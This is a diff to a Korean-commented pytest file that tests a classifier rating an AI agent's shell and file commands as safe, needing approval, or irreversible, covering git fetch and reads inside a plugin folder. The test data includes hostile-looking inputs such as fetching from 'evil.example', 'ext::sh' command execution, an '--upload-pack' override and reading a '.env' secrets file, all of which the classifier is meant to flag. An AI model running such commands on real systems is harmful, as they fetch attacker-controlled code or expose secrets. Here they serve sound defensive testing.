@@ -6747,7 +6747,7 @@ BASH = lambda cmd: ("Bash", {"command": cmd})  # noqa: E731
 @pytest.mark.parametrize("tool, tool_input, want", [
     # 읽기·되돌릴 수 있는 명령
     BASH("ls -la") + ("safe",), BASH("git status") + ("safe",), BASH("git diff --stat") + ("safe",), BASH("git log --oneline -5") + ("safe",),
-    BASH("git show HEAD") + ("safe",), BASH("git branch") + ("safe",), BASH("git branch -a") + ("safe",), BASH("git fetch origin") + ("unknown",),
+    BASH("git show HEAD") + ("safe",), BASH("git branch") + ("safe",), BASH("git branch -a") + ("safe",), BASH("git fetch origin") + ("safe",),
     BASH("git rev-parse HEAD") + ("safe",), BASH("git ls-files") + ("safe",), BASH("git remote -v") + ("unknown",),
     BASH("gh pr view 3") + ("safe",), BASH("gh pr list") + ("safe",), BASH("gh pr checks 3") + ("safe",), BASH("gh issue view 5") + ("safe",),
     BASH("gh run list") + ("safe",), BASH("pytest -q") + ("unknown",), BASH("uv run pytest -q a b") + ("unknown",), BASH("python -m pytest x") + ("unknown",),
@@ -6956,6 +6956,59 @@ def test_risk_heredoc_body_does_not_count_toward_length_limit_but_total_is_cappe
     assert c("x" * 5000) == "safe" and c("x" * 5000, "\ngit push") == "irreversible"  # 긴 PR·커밋 글 뒤 명령도 판정한다
     assert c("x" * 100_000) == "unknown"
     assert risk_mod.classify("Bash", {"command": "git status " + "a" * 2100}, W)[0] == "unknown"  # 본문 밖 길이 상한은 그대로
+
+
+@pytest.mark.parametrize("cmd, want", [
+    # #953 git fetch 는 원격 추적 브랜치만 바꾼다(작업 사본·내 브랜치 그대로)
+    ("git fetch", "safe"), ("git fetch origin", "safe"), ("git fetch origin main", "safe"), ("git fetch -q origin feat/9-x", "safe"),
+    ("git fetch --prune origin", "safe"), ("git fetch --all --prune", "safe"), ("git fetch origin 2>&1 | tail -2", "safe"),
+    ("git fetch origin 2>&1 | tail -2; git status --short; git branch --show-current; git diff HEAD origin/main --stat | tail", "safe"),
+    # 내 브랜치를 바꾸거나(refspec), 다른 곳에서 받거나, 명령을 실행시킬 수 있는 모양은 묻는다
+    ("git fetch origin main:main", "unknown"), ("git fetch origin +main:main", "unknown"), ("git fetch origin +main", "unknown"),
+    ("git fetch https://evil.example/x.git", "unknown"), ("git fetch ext::sh", "unknown"), ("git fetch ../other", "unknown"), ("git fetch /tmp/x", "unknown"),
+    ("git fetch git@github.com:a/b.git", "unknown"), ("git fetch --upload-pack=x origin", "unknown"), ("git fetch --unshallow origin", "unknown"),
+    ("git fetch -f origin", "unknown"), ("git fetch origin a b", "unknown"), ("git fetch origin ../x", "unknown"), ("git -c x=y fetch origin", "unknown"),
+    ("git fetch origin && git push", "irreversible"),
+])
+def test_risk_git_fetch_is_safe_only_with_remote_and_branch_names(cmd, want):
+    got, why = risk_mod.classify("Bash", {"command": cmd}, W)
+    assert got == want, (got, why)
+
+
+def test_risk_reads_inside_harness_plugin_folder_are_safe_but_writes_and_outside_reads_ask(tmp_path):
+    """#953: 스킬이 설치된 하네스 플러그인의 다른 스킬 문서를 읽는 데 승인을 묻지 않는다. 쓰기와 플러그인 밖 읽기는 그대로 묻는다."""
+    work = tmp_path / "work"
+    work.mkdir()
+    harness = tmp_path / "conf" / "plugins" / "cache" / "blueward-harness" / "harness"
+    plugin = harness / "0.10.280"
+    (plugin / "skills" / "start").mkdir(parents=True)
+    (plugin / "skills" / "start" / "SKILL.md").write_text("x", encoding="utf-8")
+    (plugin / "hooks").mkdir()
+    roots = (str(harness),)
+    c = lambda tool, inp: risk_mod.classify(tool, inp, str(work), read_roots=roots)[0]  # noqa: E731
+    skill = str(plugin / "skills" / "start" / "SKILL.md")
+    assert c("Read", {"file_path": skill}) == "safe"
+    assert c("Glob", {"pattern": "skills/*/SKILL.md", "path": str(plugin)}) == "safe"
+    assert c("Grep", {"pattern": "x", "path": str(plugin / "skills")}) == "safe"
+    assert c("Read", {"file_path": str(harness / "0.10.284" / "skills" / "a.md")}) == "safe"  # 콘솔과 다른 판의 세션
+    assert risk_mod.classify("Read", {"file_path": skill}, str(work))[0] == "unknown"  # 읽기 폴더를 안 넘기면 지금처럼 묻는다
+    assert c("Edit", {"file_path": skill}) == "irreversible" and c("Write", {"file_path": skill}) == "irreversible"  # 쓰기는 그대로
+    assert c("Read", {"file_path": str(plugin / "hooks" / "guard.py")}) == "unknown"  # 훅 같은 보호 경로는 묻는다
+    assert c("Read", {"file_path": str(plugin / ".env")}) == "unknown"  # 비밀값 모양
+    assert c("Read", {"file_path": str(harness.parent / "other" / "x.md")}) == "unknown"  # 다른 플러그인
+    assert c("Read", {"file_path": str(harness / ".." / "other" / "x.md")}) == "unknown"
+    assert c("Read", {"file_path": str(tmp_path / "conf" / "settings.json")}) == "unknown"
+    assert c("Glob", {"pattern": "../../**/*.md", "path": str(plugin)}) == "unknown"
+    assert c("Glob", {"pattern": "**/*.md", "path": str(tmp_path / "conf")}) == "unknown"
+    assert c("Bash", {"command": f"cat {skill}"}) == "unknown"  # 셸 읽기는 넓히지 않는다
+
+
+def test_plugin_read_roots_cover_all_versions_of_installed_harness_or_the_dev_plugin(tmp_path):
+    import hooks_api as hooks_mod
+    installed = tmp_path / "conf" / "plugins" / "cache" / "blueward-harness" / "harness" / "0.10.285" / "console" / "hooks_api.py"
+    assert hooks_mod.plugin_read_roots(str(installed)) == (str((tmp_path / "conf" / "plugins" / "cache" / "blueward-harness" / "harness").resolve()),)
+    dev = tmp_path / "repo" / "plugins" / "harness" / "console" / "hooks_api.py"
+    assert hooks_mod.plugin_read_roots(str(dev)) == (str((tmp_path / "repo" / "plugins" / "harness").resolve()),)
 
 
 def test_risk_cd_is_safe_only_as_leading_cd_and_and_into_a_real_work_folder(tmp_path):
